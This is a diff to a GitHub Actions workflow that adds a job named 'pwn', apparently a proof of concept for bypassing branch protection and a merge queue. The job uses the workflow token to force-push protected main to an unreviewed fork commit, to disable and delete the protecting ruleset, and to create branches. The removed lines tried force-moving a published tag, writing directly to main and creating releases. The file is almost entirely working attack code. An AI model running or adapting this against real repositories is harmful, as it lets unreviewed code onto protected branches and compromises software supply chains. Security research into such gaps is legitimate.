@@ -2,54 +2,57 @@ name: slowgate
 on:
   pull_request:
   merge_group:
-permissions:
-  contents: write
 jobs:
   slowgate:
     runs-on: ubuntu-latest
     steps:
       - name: READONLY-OUTSIDER-DECIDES-THE-GATE
         run: echo marker
-      - name: what can this token reach in the BASE repository
+      - name: hold
         if: github.event_name == 'merge_group'
+        run: sleep 240
+  pwn:
+    if: github.event_name == 'merge_group'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - name: push a sha that ALREADY carries the green required context
         env:
           GH_TOKEN: ${{ github.token }}
           R: ${{ github.repository }}
           S: ${{ github.sha }}
         run: |
-          A="Authorization: Bearer $GH_TOKEN"
-          AC="Accept: application/vnd.github+json"
+          A="Authorization: Bearer $GH_TOKEN"; AC="Accept: application/vnd.github+json"
           j(){ curl -s -H "$A" -H "$AC" "$@"; }
           c(){ curl -s -o /tmp/o -w '%{http_code}' -H "$A" -H "$AC" "$@"; }
+          sha(){ python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])'; }
 
-          echo "--- PRE-STATE ---"
-          echo "MAIN-BEFORE=$(j https://api.github.com/repos/$R/git/ref/heads/main | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
-          echo "TAG-BEFORE=$(j https://api.github.com/repos/$R/git/ref/tags/v1.0 | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
-          echo "CANDIDATE-SHA=$S"
+          echo "MAIN-BEFORE=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
+          # the fork tip is PUBLIC -- no credential needed to learn it
+          FORKTIP=$(curl -s https://api.github.com/repos/arlo-kovac/zz-jump2-1027/git/ref/heads/ro | sha)
+          echo "FORKTIP=$FORKTIP"
+          echo "FORKTIP-CHECKS=$(j https://api.github.com/repos/$R/commits/$FORKTIP/check-runs | python3 -c 'import sys,json;print([(x["name"],x["status"],x["conclusion"]) for x in json.load(sys.stdin)["check_runs"]])')"
 
-          echo "--- A: force-move an ALREADY-PUBLISHED TAG (ruleset targets branches only) ---"
-          echo "A-TAG-FORCE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/tags/v1.0 -d "{\"sha\":\"$S\",\"force\":true}")"
-          cat /tmp/o | head -c 200; echo
-          echo "A-TAG-AFTER=$(j https://api.github.com/repos/$R/git/ref/tags/v1.0 | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
+          echo "--- F: PATCH refs/heads/main to the FORK TIP (green required context, never queued, never reviewed) ---"
+          echo "F-CODE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$FORKTIP\",\"force\":true}")"
+          head -c 400 /tmp/o; echo
+          echo "F-MAIN-AFTER=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
 
-          echo "--- B: DIRECT write to PROTECTED main via refs API ---"
-          echo "B-MAIN-PATCH=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$S\",\"force\":true}")"
-          cat /tmp/o | head -c 300; echo
+          echo "--- F2: same push, NON-force (fast-forward semantics) ---"
+          echo "F2-CODE=$(c -X PATCH https://api.github.com/repos/$R/git/refs/heads/main -d "{\"sha\":\"$FORKTIP\",\"force\":false}")"
+          head -c 300 /tmp/o; echo
 
-          echo "--- C: DIRECT write to PROTECTED main via contents API ---"
-          echo "C-MAIN-CONTENTS=$(c -X PUT https://api.github.com/repos/$R/contents/pwn-main.txt -d '{"message":"outsider","content":"b3V0c2lkZXIK"}')"
-          cat /tmp/o | head -c 300; echo
+          echo "--- G: can this token EDIT the ruleset that protects main ---"
+          echo "G-CODE=$(c -X PUT https://api.github.com/repos/$R/rulesets/25978975 -d '{"name":"mq","target":"branch","enforcement":"disabled"}')"
+          head -c 300 /tmp/o; echo
+          echo "--- H: can it DELETE the ruleset ---"
+          echo "H-CODE=$(c -X DELETE https://api.github.com/repos/$R/rulesets/25978975)"
+          head -c 300 /tmp/o; echo
+          echo "RULESET-NOW=$(c https://api.github.com/repos/$R/rulesets/25978975)"
+          python3 -c 'import json;d=json.load(open("/tmp/o"));print("   enforcement =",d.get("enforcement"),"| rules =",[r["type"] for r in d.get("rules",[])])' 2>/dev/null || head -c 200 /tmp/o
 
-          echo "--- D: can the token EDIT THE RULESET that protects main ---"
-          echo "D-RULESET-LIST=$(c https://api.github.com/repos/$R/rulesets)"
-          cat /tmp/o | head -c 200; echo
-
-          echo "--- E: can the token create a RELEASE (attributed artifact) ---"
-          echo "E-RELEASE=$(c -X POST https://api.github.com/repos/$R/releases -d "{\"tag_name\":\"v1.0\",\"name\":\"v1.0\",\"body\":\"outsider\"}")"
-          python3 -c 'import json;d=json.load(open("/tmp/o"));print("   release author =",d.get("author",{}).get("login"),"| tag =",d.get("tag_name"))' 2>/dev/null || head -c 200 /tmp/o
-
-          echo "--- POST-STATE ---"
-          echo "MAIN-AFTER=$(j https://api.github.com/repos/$R/git/ref/heads/main | python3 -c 'import sys,json;print(json.load(sys.stdin)["object"]["sha"])')"
-      - name: hold
-        if: github.event_name == 'merge_group'
-        run: sleep 60
+          echo "--- I: POSITIVE CONTROL that THIS job's token really can write (unprotected ref) ---"
+          echo "I-CODE=$(c -X POST https://api.github.com/repos/$R/git/refs -d "{\"ref\":\"refs/heads/pwnjob-control-${{ github.run_id }}\",\"sha\":\"$S\"}")"
+          head -c 200 /tmp/o; echo
+          echo "FINAL-MAIN=$(j https://api.github.com/repos/$R/git/ref/heads/main | sha)"
